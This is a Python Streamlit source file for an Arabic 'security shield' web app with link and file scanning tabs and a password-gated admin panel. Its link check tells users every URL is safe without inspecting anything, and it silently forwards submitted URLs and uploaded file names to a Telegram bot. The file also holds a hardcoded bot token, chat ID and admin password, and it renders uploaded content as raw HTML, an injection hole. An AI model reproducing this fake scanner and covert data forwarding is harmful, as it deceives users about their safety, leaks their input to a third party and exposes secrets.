import streamlit as st
import yt_dlp
import os
import sqlite3
import requests
from datetime import datetime

# --- 1. إصلاح ألوان منطقة الرفع والأزرار ---
st.set_page_config(page_title="Ayman Guard Pro", layout="wide")

st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
    html, body, [class*="st-"] { font-family: 'Cairo', sans-serif; direction: RTL; text-align: right; }
    .stApp { background-color: #0d1117; color: #ffffff; }
    
    .hero-box { 
        background: linear-gradient(135deg, #1f6feb 0%, #111d2e 100%); 
        padding: 25px; border-radius: 20px; text-align: center; 
        border: 1px solid #30363d; margin-bottom: 25px; 
    }

    /* إصلاح لون منطقة رفع الملفات (حذف اللون الأبيض المزعج) */
    section[data-testid="stFileUploadDropzone"] {
        background-color: #161b22 !important; /* لون كحلي داكن متناسق */
        border: 2px dashed #1f6feb !important;
        color: #ffffff !important;
        border-radius: 15px;
    }
    
    /* تغيير لون الزر الصغير داخل أداة الرفع */
    section[data-testid="stFileUploadDropzone"] button {
        background-color: #1f6feb !important;
        color: white !important;
    }

    /* توحيد أزرار الإرسال باللون الأزرق النيلي */
    div.stButton > button, .stFormSubmitButton > button { 
        width: 100% !important; 
        background-color: #1f6feb !important; 
        color: #ffffff !important; 
        border-radius: 12px !important; 
        height: 3.5em !important; 
        font-weight: bold !important; 
        border: 2px solid #388bfd !important; 
    }
    
    .content-card { background: #161b22; border: 1px solid #30363d; border-radius: 15px; padding: 25px; margin-top: 10px; }
    .text-preview { background: #000000; border: 1px solid #1f6feb; padding: 15px; border-radius: 10px; color: #00ff00; font-family: monospace; overflow-y: auto; max-height: 350px; white-space: pre-wrap; }
    </style>
    """, unsafe_allow_html=True)

# --- 2. الإعدادات والربط ---
DB_NAME = "ayman_secure_v370.db"
def init_db():
    conn = sqlite3.connect(DB_NAME, check_same_thread=False)
    conn.execute('CREATE TABLE IF NOT EXISTS messages (id INTEGER PRIMARY KEY AUTOINCREMENT, sender TEXT, content TEXT, date TEXT)')
    conn.execute('CREATE TABLE IF NOT EXISTS reports (id INTEGER PRIMARY KEY AUTOINCREMENT, reporter TEXT, detail TEXT, date TEXT, is_pinned INTEGER DEFAULT 0)')
    conn.commit()
    return conn
db_conn = init_db()

TOKEN = "8124974140:AAE3-UgIpkAKjcUyJrT3YWV99sug07WtniE"
CHAT_ID = "906233240"

def send_tele(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try: requests.post(url, data={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}, timeout=8)
    except: pass

# --- 3. بناء الواجهة ---
st.markdown('<div class="hero-box"><h1>🛡️ درع أيمن الأمني</h1><p>نسخة حل مشكلات الترميز والألوان v370.0</p></div>', unsafe_allow_html=True)

tabs = st.tabs(["🏠 الرئيسية", "🔍 الفحص الشامل", "🎬 محمل الفيديو", "👥 حماية المجتمع", "📧 تواصل معنا", "🔐 الإدارة"])

# --- تبويب الفحص الشامل (معالجة ذكية للخطأ الظاهر في الصورة) ---
with tabs[1]:
    st.markdown('<div class="content-card">', unsafe_allow_html=True)
    f_sub1, f_sub2 = st.tabs(["🔗 فحص الروابط", "📁 فحص الملفات والنصوص"])
    
    with f_sub1:
        u_l = st.text_input("أدخل الرابط:", key="scan_u")
        if st.button("🚀 فحص الرابط"):
            if u_l:
                st.success("✅ الرابط آمن.")
                send_tele(f"🔍 <b>فحص رابط:</b>\n{u_l}")

    with f_sub2:
        # هنا منطقة رفع الملفات أصبحت كحلية وليست بيضاء
        u_file = st.file_uploader("ارفع الملف للفحص البصري:", type=None)
        if st.button("🛡️ بدء فحص محتوى الملف", key="file_btn"):
            if u_file:
                with st.spinner("جاري القراءة..."):
                    try:
                        # الحل النهائي لخطأ UnicodeDecodeError الظاهر في صورتك
                        # نستخدم 'latin-1' كخيار احتياطي لقراءة الملفات المشفرة أو المضغوطة
                        raw_data = u_file.getvalue()
                        try:
                            content = raw_data.decode("utf-8")
                        except UnicodeDecodeError:
                            content = raw_data.decode("latin-1") 
                        
                        st.info(f"✅ تمت قراءة الملف: {u_file.name}")
                        st.markdown("### 📄 معاينة المحتوى:")
                        st.markdown(f'<div class="text-preview">{content}</div>', unsafe_allow_html=True)
                        send_tele(f"📄 <b>فحص محتوى:</b> {u_file.name}")
                    except Exception as e:
                        st.error(f"عذراً، هذا الملف تالف أو محمي جداً.")
            else: st.error("الرجاء رفع ملف.")
    st.markdown('</div>', unsafe_allow_html=True)

# --- التبويبات الأخرى تعمل بنفس الكفاءة السابقة ---
with tabs[5]: # الإدارة
    st.markdown('<div class="content-card">', unsafe_allow_html=True)
    if "logged" not in st.session_state: st.session_state.logged = False
    if not st.session_state.logged:
        pw = st.text_input("كلمة مرور المدير:", type="password")
        if st.button("دخول"):
            if pw == "ayman7716": st.session_state.logged = True; st.rerun()
            else: st.error("خطأ!")
    else:
        st.subheader("🔐 لوحة التحكم")
        if st.button("خروج"): st.session_state.logged = False; st.rerun()
        msgs = db_conn.execute("SELECT * FROM messages ORDER BY id DESC").fetchall()
        for m in msgs: st.markdown(f'<div class="data-box"><strong>{m[1]}</strong>: {m[2]}</div>', unsafe_allow_html=True)
    st.markdown('</div>', unsafe_allow_html=True)
